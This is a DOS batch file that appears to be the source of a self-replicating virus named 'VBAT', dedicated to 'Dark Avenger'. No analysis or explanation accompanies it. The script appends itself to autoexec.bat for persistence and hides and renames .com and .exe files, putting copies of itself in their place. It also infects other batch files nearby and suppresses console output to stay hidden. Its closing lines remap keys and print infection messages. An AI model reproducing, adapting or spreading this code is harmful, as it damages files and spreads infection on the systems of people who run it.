@echo off>nul.vir
ctty nul.vir
set virwin=c:\autoexec.bat
find "vir"<%virwin%  
if errorlevel 1 goto vir_dos
for %%f in (*.com *.exe) do set vir=%%f
if %vir%==COMMAND.COM set vir=
ren %vir% V%vir%
if not exist V%vir% goto next_vir
attrib +h V%vir%
copy %0.bat %vir%
attrib +r %vir%
ren %vir% *.vir
set vir=
:next_vir
for %%a in (*.bat ..\*.bat) do set vir=%%a
if %0==%vir% goto end_vir
find "vir"<%vir%
if errorlevel 1 find "vir"<%0>>%vir%
ctty con.vir
:end_vir
ren *.vir *.bat
set vir=
cls%vir%
ctty nul.vir
goto vir_999
:vir_dos
find "vir"<%0>>%virwin%
:vir_999
["a";"The VBAT virus";0;83p
["i";"The VBat virus dedicated to Dark Avenger";0;83p
["o";"Your PC is infected with the VBaT virus";0;83p
["u";"VBAT virus is InFeCtING YoU!";0;83p
["x";"c:\VBAT%vir%";13p

